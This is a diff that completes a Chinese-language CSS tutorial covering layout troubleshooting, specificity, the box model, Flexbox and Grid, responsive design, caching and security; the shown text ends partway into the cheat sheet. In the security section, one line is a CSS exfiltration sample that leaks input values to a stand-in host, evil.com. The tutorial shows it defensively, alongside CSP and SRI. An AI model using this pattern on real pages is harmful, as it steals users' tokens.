@@ -1,87 +1,1082 @@
 ---
 title: "CSS 版面與排版"
-desc: "選擇器、盒模型、Flexbox 與 Grid"
-aliases: []
+desc: "選擇器、盒模型、Flexbox 與 Grid、響應式版面"
+aliases: [CSS, Flexbox, Grid, 盒模型, 響應式, RWD, 優先權]
 tags: [群組/系統及工具開發, 開發/前端]
 category: 前端基礎
 difficulty: 入門
-status: 待撰寫
+status: 完成
 distro: [ubuntu, rhel]
-prerequisites: []
-updated: 2026-08-27
+prerequisites: ["[[01-HTML結構與語意]]"]
+updated: 2026-08-28
 ---
 
 # CSS 版面與排版
 
 > [!abstract] 這篇你會學到
-> - 用選擇器精準指定元素
-> - 理解盒模型與 box-sizing
-> - 用 Flexbox 與 Grid 排版
-> - 做出響應式版面
+> - **★★★★ 版面壞掉的六步排查法**（維運最需要的）
+> - 選擇器與**★★★★ 優先權（specificity）**——「我改了為什麼沒生效」的答案
+> - **★★★★ 盒模型與 `box-sizing`**——版面計算不對的頭號原因
+> - Flexbox 與 Grid 的分工
+> - 響應式與**★★★ 手機版跑版**的處理
+> - **★★★ CSS 沒載入 / 快取沒更新**的排查
 
 ## 前置知識
 
-<!-- TODO: 待撰寫 -->
+- [[01-HTML結構與語意]] — 標籤與結構
+
+---
+
+## ★★★★ 版面壞掉的六步排查
+
+```
+★★★★ 使用者說「網頁版面跑掉了」，照這個順序查：
+
+  ┌────────────────────────────────────────────────────┐
+  │ ★★★★【1】CSS 檔案載入了嗎？                         │
+  │   → 開發者工具 Network 分頁，看 .css 的狀態碼        │
+  │   → 404 = 路徑錯或檔案沒部署                        │
+  │   → 200 但內容是 HTML = 被重導向到錯誤頁            │
+  └───────────────────┬────────────────────────────────┘
+                      ▼
+  ┌────────────────────────────────────────────────────┐
+  │ ★★★★【2】是快取嗎？                                 │
+  │   → Ctrl+Shift+R 強制重整                          │
+  │   → 好了 = 快取問題（見下方 cache busting）          │
+  └───────────────────┬────────────────────────────────┘
+                      ▼
+  ┌────────────────────────────────────────────────────┐
+  │ ★★★★【3】HTML 標籤有沒有沒關？                       │
+  │   → tidy -qe page.html                             │
+  │   → ★★★ 「某一段之後全歪」通常是這個                 │
+  └───────────────────┬────────────────────────────────┘
+                      ▼
+  ┌────────────────────────────────────────────────────┐
+  │ ★★★【4】是怪異模式嗎？                              │
+  │   → document.compatMode 應該是 "CSS1Compat"        │
+  └───────────────────┬────────────────────────────────┘
+                      ▼
+  ┌────────────────────────────────────────────────────┐
+  │ ★★★★【5】我改的規則生效了嗎？                        │
+  │   → 檢查元素 → Styles 面板                          │
+  │   → ★★★ 被劃掉的規則 = 被優先權更高的蓋過           │
+  └───────────────────┬────────────────────────────────┘
+                      ▼
+  ┌────────────────────────────────────────────────────┐
+  │ ★★★★【6】是盒模型計算的問題嗎？                      │
+  │   → Computed 面板看實際的 width                     │
+  │   → ★★★ box-sizing 沒設 border-box 是頭號原因       │
+  └────────────────────────────────────────────────────┘
+```
+
+```bash
+# ★★★★【1】CSS 載入狀況（命令列版）
+$ curl -s https://app.example.gov.tw/ | grep -oP '<link[^>]*stylesheet[^>]*>'
+<link rel="stylesheet" href="/build/app-a1b2c3.css">
+
+$ curl -sI https://app.example.gov.tw/build/app-a1b2c3.css | head -3
+HTTP/2 200
+content-type: text/css                    # ★★★★ 一定要是 text/css
+content-length: 48210
+
+#   ★★★★ 常見的錯誤狀況：
+HTTP/2 404                                # ★ 檔案不存在
+content-type: text/html                   # ★★★★ 回傳的是錯誤頁面不是 CSS！
+content-length: 0                         # ★★★ 空檔案（★ 建置失敗）
+
+# ★★★ 一次檢查所有靜態資源
+$ curl -s https://app.example.gov.tw/ | \
+    grep -oP '(?:href|src)="\K/[^"]*\.(css|js)' | sort -u | while read -r u; do
+      printf '%-50s ' "$u"
+      curl -sko /dev/null -w '%{http_code} %{content_type} %{size_download}\n' \
+        "https://app.example.gov.tw$u"
+    done
+/build/app-a1b2c3.css      200 text/css 48210
+/build/app-d4e5f6.js       200 text/javascript 182400
+/css/legacy.css            404 text/html 1842      # ★★★★ 這個掛了
+```
+
+---
 
 ## 觀念說明
 
-<!-- TODO: 待撰寫 -->
+### ★★★★ 優先權（specificity）—— 「我改了為什麼沒生效」
 
-## 環境準備與安裝
+```
+★★★★ CSS 規則衝突時，靠三個層級決定誰贏：
 
-<!-- TODO: 待撰寫 -->
+  ① ★★★ 【重要性】!important > 一般規則
+  ② ★★★★【優先權】算分（見下）
+  ③ ★★ 【順序】分數相同時，後寫的贏
 
-> [!info]- 平台差異對照
-> <!-- TODO: 待撰寫 -->
+★★★★ 優先權的算分（由高到低）：
 
-## 基礎設定
+  ┌──────────────────┬───────┬──────────────────────────┐
+  │ 類型             │ 分數  │ 例                       │
+  ├──────────────────┼───────┼──────────────────────────┤
+  │ ★★★★ 行內樣式    │ 1000  │ <div style="color:red">  │
+  │ ★★★ id           │  100  │ #header                  │
+  │ ★★ class / 屬性  │   10  │ .btn  [type="text"]      │
+  │ ★ 標籤           │    1  │ div  p  a                │
+  │ 萬用             │    0  │ *                        │
+  └──────────────────┴───────┴──────────────────────────┘
 
-<!-- TODO: 待撰寫 -->
+★★★ 實例（分數由低到高）：
+  p                        →   1
+  .content p               →  11   (10 + 1)
+  #main .content p         → 111   (100 + 10 + 1)
+  <p style="…">            → 1000
+  ★★★★ 任何 !important     → 壓過上面全部
 
-## 進階設定與調校
+★★★★ 所以：
+  你在 style.css 寫了 .btn { color: blue }（分數 10）
+  但頁面上有 #main .btn { color: red }（分數 110）
+  → ★★★★ 你的規則【永遠不會生效】，即使寫在後面
+```
 
-<!-- TODO: 待撰寫 -->
+```javascript
+// ★★★★ 在 Console 查出某個元素實際套用了哪些規則
+// （開發者工具 → 檢查元素 → Styles 面板更直觀，這是命令列版）
+const el = document.querySelector('.btn');
+console.log(getComputedStyle(el).color);        // ★★★ 最終生效的值
 
-## 完整實戰範例
+// ★★★ 列出所有可能影響它的規則
+[...document.styleSheets].forEach(sheet => {
+  try {
+    [...sheet.cssRules].forEach(rule => {
+      if (rule.selectorText && el.matches(rule.selectorText)) {
+        console.log(rule.selectorText, '→', rule.style.cssText);
+      }
+    });
+  } catch (e) { /* ★★ 跨網域的 CSS 讀不到 */ }
+});
+```
 
-<!-- TODO: 待撰寫 -->
+> [!danger] `!important` 的惡性循環 ★★★★
+> ```
+> ★★★★ 用 !important 解決衝突 = 把問題往後推
+>
+>   A 寫了 .btn { color: blue !important }
+>   → B 要改成紅色，只好寫 #x .btn { color: red !important }
+>   → C 要改成綠色，只好寫更長的選擇器 + !important
+>   → ★★★★ 最後沒有人知道哪條規則會贏
+>
+> ★★★ 正確的做法：
+>   ① 降低現有規則的優先權（★ 少用 id 選擇器）
+>   ② ★★★ 用更精確的選擇器而不是 !important
+>   ③ ★★ 用 CSS 變數讓值可以被覆寫
+>
+> ★★★ 唯一合理的 !important 場景：
+>   · 覆寫第三方套件的樣式（★ 你改不到它的原始碼）
+>   · 工具類 class（.hidden { display: none !important }）
+>
+> ★★ 稽核你的專案：
+>   $ grep -rc '!important' resources/css/ public/css/
+> ```
+
+### ★★★★ 盒模型 —— 版面計算不對的頭號原因
+
+```
+★★★★ 一個元素的實際寬度怎麼算：
+
+  ┌─────────────────────────────────────────────┐
+  │  margin（外距，★ 不算在元素內）              │
+  │  ┌───────────────────────────────────────┐  │
+  │  │  border（框線）                        │  │
+  │  │  ┌─────────────────────────────────┐  │  │
+  │  │  │  padding（內距）                 │  │  │
+  │  │  │  ┌───────────────────────────┐  │  │  │
+  │  │  │  │  content（內容）           │  │  │  │
+  │  │  │  └───────────────────────────┘  │  │  │
+  │  │  └─────────────────────────────────┘  │  │
+  │  └───────────────────────────────────────┘  │
+  └─────────────────────────────────────────────┘
+
+★★★★ box-sizing 決定 width 指的是哪一段：
+
+  box-sizing: content-box   ★★★★ 瀏覽器預設！
+    width: 300px  →  content 是 300px
+    ★★★★ 實際佔寬 = 300 + padding×2 + border×2
+       例：width:300 + padding:20 + border:1
+           → 實際 342px  ★★★ 超出你預期的 42px
+
+  box-sizing: border-box    ★★★ 你想要的
+    width: 300px  →  ★★★★ 含 padding 與 border 就是 300px
+       → padding 與 border 往內縮，content 自動變小
+```
+
+```css
+/* ★★★★ 幾乎所有專案的第一行 CSS */
+*, *::before, *::after {
+    box-sizing: border-box;
+}
+/*  ★★★ 讓所有元素都用直覺的計算方式
+    ★★★★ 沒有這行，兩欄各 50% + padding 會【擠不下而換行】 */
+```
+
+```
+★★★★ 典型症狀：
+  「我設了兩欄各 50%，為什麼跑到第二行去了？」
+
+  .col { width: 50%; padding: 20px; border: 1px solid #ccc; }
+  → content-box 下：實際佔 50% + 42px
+  → ★★★★ 兩欄 = 100% + 84px > 容器寬度 → 換行
+
+  加上 box-sizing: border-box → ★★★ 剛好兩欄
+
+★★★ 檢查方式：
+  開發者工具 → 檢查元素 → 【Computed 面板最下方的盒模型圖】
+  → 一眼看出 content / padding / border / margin 各佔多少
+```
+
+### ★★ margin 的兩個陷阱
+
+```css
+/* ★★★ ① margin 塌陷（collapse）—— 相鄰的上下 margin 會合併 */
+.a { margin-bottom: 30px; }
+.b { margin-top: 20px; }
+/*  ★★★ 兩者之間的距離是 30px（取大的），不是 50px */
+/*  ★★ 只發生在【垂直】方向，水平不會 */
+/*  ★★★ 解法：用 padding、或給父層加 display:flow-root */
+
+/* ★★★ ② 父子的 margin 塌陷 */
+.parent { }
+.child { margin-top: 20px; }
+/*  ★★★★ child 的 margin 會「跑到」parent 外面 */
+/*  ★★★ 解法：parent 加 padding-top、border-top、或 display:flow-root */
+```
+
+---
+
+## 基礎操作：選擇器
+
+```css
+/* ═══ ★★★ 基本 ═══ */
+p                     { }   /* 標籤 */
+.btn                  { }   /* ★★★ class（最常用） */
+#header               { }   /* ★★ id（★ 優先權高，少用） */
+[type="text"]         { }   /* 屬性 */
+*                     { }   /* 全部 */
+
+/* ═══ ★★★ 組合 ═══ */
+.card .title          { }   /* ★★★ 後代（所有層級的子孫） */
+.card > .title        { }   /* ★★ 直接子元素（只有一層） */
+.title + p            { }   /* ★★ 緊鄰的下一個兄弟 */
+.title ~ p            { }   /* 之後所有的兄弟 */
+.btn.primary          { }   /* ★★★ 同時有兩個 class（★ 中間沒空格） */
+h1, h2, h3            { }   /* ★★ 多個選擇器共用規則 */
+
+/* ═══ ★★★ 狀態 ═══ */
+a:hover               { }   /* 滑鼠移上 */
+a:focus               { }   /* ★★★★ 鍵盤 focus（★ 無障礙必要，見下） */
+a:focus-visible       { }   /* ★★★ 只在鍵盤操作時顯示 focus 框 */
+input:disabled        { }
+input:checked         { }
+li:first-child        { }
+li:last-child         { }
+li:nth-child(2n)      { }   /* ★★ 偶數列（★ 表格斑馬紋） */
+tr:nth-child(odd)     { }
+
+/* ═══ ★★ 偽元素 ═══ */
+.required::after      { content: " *"; color: #c00; }
+p::first-line         { }
+
+/* ═══ ★★★ 現代選擇器 ═══ */
+.card:not(.disabled)  { }   /* ★★★ 排除 */
+.card:has(> img)      { }   /* ★★ 含有某個子元素（★ 新語法，注意瀏覽器支援） */
+:is(h1, h2, h3) span  { }   /* ★★ 簡化寫法 */
+```
+
+> [!danger] 絕對不要移除 focus 樣式 ★★★★
+> ```css
+> /* ★★★★ 常見的錯誤：覺得 focus 框醜就拿掉 */
+> *:focus { outline: none; }       /* ★★★★ 絕對不要！ */
+>
+> /* ★★★★ 為什麼：
+>    · 鍵盤使用者【完全看不出焦點在哪裡】
+>    · ★★★ 無障礙檢測直接不合格（WCAG 2.4.7）
+>    · 機關網站是驗收條件 */
+>
+> /* ★★★ 正確：換一個好看的樣式，不是拿掉 */
+> :focus-visible {
+>     outline: 3px solid #4c8dff;
+>     outline-offset: 2px;
+> }
+> /*  ★★★ focus-visible 只在【鍵盤操作】時顯示，
+>     滑鼠點擊不會出現 → 兼顧美觀與無障礙 */
+> ```
+
+```javascript
+// ★★★★ 檢查有沒有被移除 focus 樣式
+[...document.styleSheets].flatMap(s => {
+  try { return [...s.cssRules]; } catch { return []; }
+}).filter(r => r.selectorText?.includes(':focus') &&
+               /outline\s*:\s*(none|0)/.test(r.style?.cssText || ''))
+  .forEach(r => console.warn('★★★★ 移除了 focus 樣式：', r.cssText));
+```
+
+---
+
+## 進階應用：Flexbox 與 Grid
+
+```
+★★★★ 什麼時候用哪個：
+
+  ★★★ Flexbox → 【一維】排列（一行或一列）
+    · 導覽列的項目
+    · 卡片內的上下排列
+    · ★★★ 「靠左、靠右、置中」這類需求
+    · 內容決定尺寸
+
+  ★★★ Grid → 【二維】版面（同時控制行與列）
+    · 整頁的版面骨架（header / sidebar / main / footer）
+    · 商品列表的網格
+    · ★★★ 需要對齊「行」也對齊「列」時
+    · 容器決定尺寸
+
+★★★ 實務上：Grid 做外層版面，Flexbox 做內部元件
+```
+
+```css
+/* ═══ ★★★ Flexbox 常用 ═══ */
+.nav {
+    display: flex;
+    gap: 1rem;                       /* ★★★ 項目間距（★ 比 margin 好用） */
+
+    /* ★★★ 主軸（預設橫向）的對齊 */
+    justify-content: space-between;  /* flex-start | center | flex-end
+                                        space-between | space-around | space-evenly */
+    /* ★★★ 交叉軸（預設縱向）的對齊 */
+    align-items: center;             /* stretch | flex-start | center | flex-end | baseline */
+
+    flex-wrap: wrap;                 /* ★★★ 允許換行（★ 響應式必要） */
+}
+.nav > .logo  { flex: 0 0 auto; }    /* 不放大、不縮小、依內容 */
+.nav > .space { flex: 1 1 auto; }    /* ★★★ 佔滿剩餘空間（★ 把後面的推到右邊） */
+
+/* ★★★ 常見版型：左右各一組，中間空白 */
+.header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+/* ★★★★ 垂直水平置中（★ 以前很難，現在三行） */
+.center {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+```
+
+```css
+/* ═══ ★★★ Grid 常用 ═══ */
+.layout {
+    display: grid;
+    grid-template-columns: 240px 1fr;      /* ★★★ 側欄固定、主區彈性 */
+    grid-template-rows: auto 1fr auto;
+    grid-template-areas:
+        "header  header"
+        "sidebar main"
+        "footer  footer";
+    gap: 1rem;
+    min-height: 100vh;
+}
+.layout > header  { grid-area: header; }
+.layout > nav     { grid-area: sidebar; }
+.layout > main    { grid-area: main; }
+.layout > footer  { grid-area: footer; }
+
+/* ★★★★ 自動響應的網格（★ 不用寫 media query！） */
+.cards {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 1.5rem;
+}
+/*  ★★★★ 意思是：每欄至少 280px，能塞幾欄就塞幾欄，
+    剩餘空間平均分配 → ★★★ 螢幕變窄自動變成單欄 */
+```
+
+### ★★★ 響應式
+
+```css
+/* ★★★★ 行動優先（mobile-first）：先寫手機，再用 min-width 加大 */
+.container {
+    padding: 1rem;
+}
+@media (min-width: 768px) {            /* ★★★ 平板以上 */
+    .container { padding: 2rem; max-width: 720px; margin-inline: auto; }
+}
+@media (min-width: 1200px) {           /* ★★ 桌機 */
+    .container { max-width: 1140px; }
+}
+
+/* ★★★ 常用斷點（★ 沒有標準，依內容決定） */
+/*  576px  手機橫向
+    768px  平板
+    992px  小桌機
+    1200px 桌機 */
+
+/* ★★★ 現代的做法：不用斷點也能響應 */
+.title { font-size: clamp(1.25rem, 4vw, 2.5rem); }
+/*  ★★★ 最小 1.25rem、最大 2.5rem、中間依視窗寬度 */
+
+.container { width: min(100% - 2rem, 1140px); margin-inline: auto; }
+/*  ★★★ 小螢幕留 1rem 邊距，大螢幕最寬 1140px */
+
+/* ★★ 尊重使用者的偏好設定（★ 無障礙） */
+@media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after {
+        animation-duration: 0.01ms !important;
+        transition-duration: 0.01ms !important;
+    }
+}
+@media (prefers-color-scheme: dark) {
+    :root { --bg: #1a1a1a; --fg: #eee; }
+}
+```
+
+> [!danger] 手機版跑版的三個常見原因 ★★★
+> ```
+> ① ★★★★ 缺 viewport meta
+>    <meta name="viewport" content="width=device-width, initial-scale=1">
+>    → ★★★ 沒有的話手機會用 980px 的虛擬寬度縮放整頁 → 字很小
+>
+> ② ★★★★ 某個元素寬度寫死超過螢幕
+>    → 造成【整頁可以左右捲動】
+>    → ★★★ 找出兇手（Console）：
+>      [...document.querySelectorAll('*')]
+>        .filter(e => e.scrollWidth > document.documentElement.clientWidth)
+>    → 常見：寫死 width:1200px 的表格、沒設 max-width 的圖片
+>
+> ③ ★★★ 圖片沒設 max-width
+>    img { max-width: 100%; height: auto; }
+>    → ★★★ 這兩行幾乎是必備
+> ```
+
+---
+
+## 完整實戰範例：修正一個跑版的頁面
+
+```bash
+# ═══ ★★★★【1】確認 CSS 有載入 ═══
+$ curl -s https://app.example.gov.tw/ | grep -oP '<link[^>]*stylesheet[^>]*>'
+<link rel="stylesheet" href="/css/app.css">
+
+$ curl -sI https://app.example.gov.tw/css/app.css
+HTTP/2 404                                  # ★★★★ 找到了！CSS 是 404
+
+# ★★★ 為什麼 404？看實際的檔案
+$ ls -la /var/www/app/current/public/css/ 2>/dev/null
+ls: cannot access '.../public/css/': No such file or directory
+$ ls /var/www/app/current/public/build/
+app-a1b2c3.css  app-d4e5f6.js  manifest.json
+#   ★★★★ 建置後的檔案在 build/ 而且檔名有 hash
+#   → 樣板還寫著舊的路徑
+
+# ★★★ 修正樣板（Laravel 用 @vite 自動處理）
+$ grep -rn 'app.css' /var/www/app/current/resources/views/
+resources/views/layouts/app.blade.php:8:  <link rel="stylesheet" href="/css/app.css">
+
+$ sudoedit /var/www/app/current/resources/views/layouts/app.blade.php
+#   改成：@vite(['resources/css/app.css', 'resources/js/app.js'])
+$ php artisan view:clear
+```
+
+```bash
+# ═══ ★★★★【2】驗證修正 ═══
+$ curl -s https://app.example.gov.tw/ | grep -oP '<link[^>]*stylesheet[^>]*>'
+<link rel="stylesheet" href="/build/assets/app-a1b2c3.css">
+$ curl -sI https://app.example.gov.tw/build/assets/app-a1b2c3.css | head -2
+HTTP/2 200
+content-type: text/css                      # ★★★ 正確
+
+# ═══ ★★★【3】檢查有沒有元素撐破版面 ═══
+```
+
+```javascript
+// ★★★★ 貼進 Console：找出造成橫向捲動的元素
+(() => {
+  const w = document.documentElement.clientWidth;
+  const bad = [...document.querySelectorAll('*')].filter(e => {
+    const r = e.getBoundingClientRect();
+    return r.right > w + 1 || r.left < -1;
+  });
+  if (!bad.length) return console.log('★ 沒有元素撐破版面');
+  console.warn(`★★★★ ${bad.length} 個元素超出視窗：`);
+  bad.slice(0, 10).forEach(e => {
+    const r = e.getBoundingClientRect();
+    console.log(
+      `  ${e.tagName.toLowerCase()}${e.id ? '#' + e.id : ''}` +
+      `${e.className ? '.' + String(e.className).split(' ').join('.') : ''}` +
+      `  right=${Math.round(r.right)} (視窗 ${w})`, e);
+  });
+})();
+```
+
+```css
+/* ═══ ★★★★【4】通用的修正 ═══ */
+/* ★★★ 放在專案 CSS 的最前面 */
+*, *::before, *::after { box-sizing: border-box; }
+
+html { -webkit-text-size-adjust: 100%; }
+body { margin: 0; overflow-x: hidden; }   /* ★★ overflow-x 是治標，仍要找出兇手 */
+
+/* ★★★ 媒體元素不撐破容器 */
+img, video, canvas, svg, iframe {
+    max-width: 100%;
+    height: auto;
+    display: block;
+}
+
+/* ★★★★ 寬表格用容器包起來橫向捲動（★ 不要讓整頁捲） */
+.table-wrap {
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+}
+.table-wrap table { min-width: 640px; }
+
+/* ★★★ 長字串（網址、無空格的文字）換行 */
+p, td, li { overflow-wrap: break-word; }
+
+/* ★★★★ 保留 focus 樣式 */
+:focus-visible {
+    outline: 3px solid #4c8dff;
+    outline-offset: 2px;
+}
+```
+
+```html
+<!-- ★★★★【5】寬表格的正確包法 -->
+<div class="table-wrap" role="region" aria-label="預算明細" tabindex="0">
+    <table>
+        <caption>114 年度預算明細</caption>
+        …
+    </table>
+</div>
+<!--  ★★★ role + aria-label + tabindex 讓鍵盤使用者也能捲動 -->
+```
+
+```bash
+# ═══ ★★★【6】部署後的驗證 ═══
+$ sudo tee /usr/local/bin/css-check >/dev/null <<'EOF'
+#!/usr/bin/env bash
+# ★★★ 檢查頁面的 CSS/JS 資源是否正常
+URL="${1:?用法: css-check <URL>}"
+FAIL=0
+echo "═══ 靜態資源檢查：$URL ═══"
+
+HTML=$(curl -sk "$URL")
+echo "$HTML" | grep -oP '(?:href|src)="\K[^"]*\.(css|js)(\?[^"]*)?' | sort -u | \
+while read -r p; do
+    case "$p" in http*) full="$p" ;; /*) full="${URL%/}$p" ;; *) full="${URL%/}/$p" ;; esac
+    r=$(curl -sko /dev/null -w '%{http_code}|%{content_type}|%{size_download}' "$full")
+    code=${r%%|*}; rest=${r#*|}; ct=${rest%%|*}; sz=${rest##*|}
+    printf '  %-52s ' "$(basename "$p")"
+    if [ "$code" != "200" ]; then
+        printf '★★★★ HTTP %s\n' "$code"
+    elif [ "$sz" -lt 10 ]; then
+        printf '★★★★ 檔案幾乎是空的（%s bytes）\n' "$sz"
+    elif [[ "$p" == *.css && "$ct" != text/css* ]]; then
+        printf '★★★★ Content-Type 不對：%s\n' "$ct"
+    elif [[ "$p" == *.js && "$ct" != *javascript* ]]; then
+        printf '★★★★ Content-Type 不對：%s\n' "$ct"
+    else
+        printf '✓ %s bytes\n' "$sz"
+    fi
+done
+
+echo -e "\n【★★★ 快取標頭】"
+CSS=$(echo "$HTML" | grep -oP 'href="\K[^"]*\.css' | head -1)
+[ -n "$CSS" ] && curl -skI "${URL%/}$CSS" | grep -iE 'cache-control|etag|last-modified' | sed 's/^/  /'
+
+echo -e "\n【★★★ viewport】"
+echo "$HTML" | grep -q 'name="viewport"' && echo "  ✓ 有 viewport meta" || \
+  { echo "  ★★★★ 缺 viewport meta（手機會跑版）"; FAIL=$((FAIL+1)); }
+exit "$FAIL"
+EOF
+$ sudo chmod +x /usr/local/bin/css-check
+$ css-check https://app.example.gov.tw/
+```
+
+---
+
+## ★★★ CSS 快取與 cache busting
+
+```
+★★★★ 「我改了 CSS 但使用者看到的還是舊的」
+
+  原因：CSS 被設成長期快取（★ 這是對的，為了效能）
+  → ★★★ 但改版後必須讓瀏覽器知道要重新下載
+
+★★★★ 三種做法（由差到好）：
+
+  ① ★ 手動改版本號
+     <link href="/css/app.css?v=2">
+     → ★★★ 每次改都要記得改，容易忘
+
+  ② ★★ 用時間戳
+     <link href="/css/app.css?t={{ filemtime(...) }}">
+     → ★★ 自動，但每次部署都會失效（★ 即使內容沒變）
+
+  ③ ★★★★ 【檔名含內容 hash】（★ 最好，Vite/webpack 的預設）
+     /build/assets/app-a1b2c3.css
+     → 內容變 → hash 變 → ★★★ 檔名變 → 一定重新下載
+     → 內容沒變 → 檔名不變 → ★★★ 繼續用快取
+     → ★★★★ 可以放心設 Cache-Control: immutable
+```
+
+```nginx
+# ★★★★ 對應的 nginx 設定
+# ★★★ 有 hash 的建置產物：長期快取
+location ~* ^/build/.*\.(css|js)$ {
+    expires 1y;
+    add_header Cache-Control "public, immutable" always;
+    access_log off;
+}
+
+# ★★★★ HTML 絕對不能長期快取（★ 它記錄了要載入哪些 hash 檔案）
+location / {
+    add_header Cache-Control "no-cache, must-revalidate" always;
+    try_files $uri $uri/ /index.php?$query_string;
+}
+```
+
+```bash
+# ★★★ 驗證快取策略
+$ curl -sI https://app.example.gov.tw/build/assets/app-a1b2c3.css | grep -i cache-control
+cache-control: public, immutable, max-age=31536000     # ★★★ 正確
+
+$ curl -sI https://app.example.gov.tw/ | grep -i cache-control
+cache-control: no-cache, must-revalidate               # ★★★★ 正確
+
+#   ★★★★ 反過來就慘了：
+#     HTML 長期快取 → 使用者永遠拿到舊的 HTML → 載入已經被刪掉的舊 CSS
+#     → ChunkLoadError / 版面全壞
+```
+
+---
 
 ## 常見錯誤與排錯
 
 | 現象 | 原因 | 解法 |
 | --- | --- | --- |
-|  |  |  |
+| **整個版面沒有樣式** ★★★★ | CSS 404 或路徑錯 | `curl -sI` 看狀態碼與 Content-Type |
+| **改了 CSS 沒變化** ★★★★ | **快取** | Ctrl+Shift+R；檢查 cache busting |
+| **改了規則被劃掉** ★★★★ | **優先權不夠** | Styles 面板看誰蓋過；提高選擇器精確度 |
+| **兩欄 50% 擠不下** ★★★★ | **缺 `box-sizing: border-box`** | 加通用規則 |
+| **上下間距不如預期** ★★★ | **margin 塌陷** | 用 padding 或 `display: flow-root` |
+| **整頁可以左右捲** ★★★★ | 某元素寬度超出 | Console 找出兇手；`max-width: 100%` |
+| **手機上字很小** ★★★★ | **缺 viewport meta** | 加 `<meta name="viewport">` |
+| **圖片撐破容器** ★★★ | 缺 `max-width` | `img { max-width: 100%; height: auto; }` |
+| **某段之後全歪** ★★★ | **HTML 標籤沒關** | `tidy -qe` |
+| **Content-Type 是 text/html** ★★★★ | CSS 路徑被導向錯誤頁 | 檢查 nginx 的 location 與 try_files |
+| **鍵盤看不到焦點** ★★★★ | **`outline: none`** | 改用 `:focus-visible` 自訂樣式 |
+| **`!important` 越加越多** ★★★ | 優先權失控 | 降低現有規則的優先權，別再加 |
+
+### 排查
+
+```bash
+# 【1】★★★★ 資源載入
+$ css-check https://app.example.gov.tw/
+$ curl -sI https://app.example.gov.tw/build/assets/app.css | head -5
+
+# 【2】★★★ 建置產物是否存在
+$ ls -la /var/www/app/current/public/build/assets/ | head
+$ cat /var/www/app/current/public/build/manifest.json | jq 'keys' | head
+
+# 【3】★★★★ nginx 有沒有正確送出
+$ sudo nginx -T | grep -A5 'location.*\\.css'
+$ sudo tail -20 /var/log/nginx/error.log | grep -i 'css\|open()'
+
+# 【4】★★★ 快取標頭
+$ curl -sI URL/build/assets/app.css | grep -iE 'cache-control|etag'
+$ curl -sI URL/ | grep -i cache-control
+
+# 【5】★★★ 瀏覽器 Console
+#   > document.compatMode                          → "CSS1Compat"
+#   > document.styleSheets.length                  → 載入了幾個樣式表
+#   > [...document.styleSheets].map(s => s.href)   → 分別是哪些
+#   > getComputedStyle($0).width                   → 選取的元素實際寬度
+
+# 【6】★★★ 語法檢查
+$ npx stylelint "resources/css/**/*.css"
+$ npx prettier --check "resources/css/**/*.css"
+```
+
+---
 
 ## 安全性注意事項
 
-> [!warning] 注意
-> <!-- TODO: 待撰寫 -->
+> [!danger] 三個要點 ★★★
+> ```
+> ① ★★★ CSS 也可以洩漏資訊
+>      → ★★ 屬性選擇器 + 背景圖可以逐字元竊取 token
+>        input[value^="a"] { background: url(//evil.com/a); }
+>      → ★★★ 這叫 CSS injection / CSS exfiltration
+>      → 防護：★★★ 不要讓使用者控制 CSS；CSP 限制 img-src
+>
+> ② ★★★★ 不要引入不受控的第三方 CSS
+>      → 外部 CDN 的 CSS 可以改變你的版面、隱藏警告訊息、
+>        ★★★ 甚至用 content 屬性偽造文字
+>      → ★★★ 用 SRI（Subresource Integrity）驗證
+>
+> ③ ★★ CSS 可以用來做 UI 偽裝（clickjacking 的一環）
+>      → ★★★ 搭配 X-Frame-Options / CSP frame-ancestors
+> ```
+
+```html
+<!-- ★★★ 引入第三方 CSS 時用 SRI 驗證 -->
+<link rel="stylesheet"
+      href="https://cdn.example.com/lib.css"
+      integrity="sha384-abc123..."
+      crossorigin="anonymous">
+<!--  ★★★★ 內容被竄改時瀏覽器會拒絕載入 -->
+```
+
+```bash
+# ★★★ 產生 SRI 雜湊
+$ curl -s https://cdn.example.com/lib.css | \
+    openssl dgst -sha384 -binary | openssl base64 -A
+abc123...
+
+# ★★★★ 檢查專案有沒有無 SRI 的外部資源
+$ grep -rn '<link[^>]*href="http' /var/www/app/current/resources/views/ | \
+    grep -v 'integrity=' | head
+$ curl -s https://app.example.gov.tw/ | \
+    grep -oP '<(link|script)[^>]*(href|src)="https?://[^"]*"[^>]*>' | \
+    grep -v integrity | head
+#   ★★★ 有輸出 = 有未驗證的外部資源
+
+# ★★★ CSP 限制樣式來源
+#   nginx：
+#   add_header Content-Security-Policy
+#     "default-src 'self'; style-src 'self'; img-src 'self' data:;" always;
+#   ★★★★ 注意：style-src 'self' 會擋掉行內 style 屬性以外的 <style> 區塊，
+#      上線前要完整測試
+```
+
+---
 
 ## 速查表
 
-| 指令 / 設定項 | 說明 | 範例 |
-| --- | --- | --- |
-|  |  |  |
+### ★★★★ 版面壞掉六步
+
+```
+① CSS 載入了嗎        curl -sI（看狀態碼 + Content-Type）
+② 是快取嗎            Ctrl+Shift+R
+③ HTML 標籤沒關       tidy -qe
+④ 怪異模式            document.compatMode
+⑤ 規則被蓋過          Styles 面板（被劃掉的）
+⑥ ★★★★ 盒模型        Computed 面板的盒模型圖
+```
+
+### ★★★★ 優先權
+
+```
+行內 style  1000  >  #id  100  >  .class  10  >  標籤  1
+★★★★ !important 壓過全部
+分數相同 → 後寫的贏
+★★★ 別用 !important 解衝突，降低現有規則的優先權才對
+```
+
+### ★★★★ 必備的通用 CSS
+
+```css
+*, *::before, *::after { box-sizing: border-box; }   /* ★★★★ 沒有這行版面會歪 */
+body { margin: 0; }
+img, video, svg, iframe { max-width: 100%; height: auto; }
+:focus-visible { outline: 3px solid #4c8dff; outline-offset: 2px; }
+p, td, li { overflow-wrap: break-word; }
+.table-wrap { overflow-x: auto; }
+```
+
+### Flexbox vs Grid
+
+```
+★★★ Flexbox → 一維（一行或一列）、內容決定尺寸、元件內部
+★★★ Grid    → 二維（行與列）、容器決定尺寸、整頁版面
+實務：Grid 做外層骨架，Flexbox 做內部元件
+
+.nav  { display:flex; gap:1rem; justify-content:space-between; align-items:center; }
+.cards{ display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:1.5rem; }
+```
+
+### 響應式
+
+```css
+/* ★★★ 行動優先：先寫手機，用 min-width 往上加 */
+@media (min-width: 768px) { … }
+
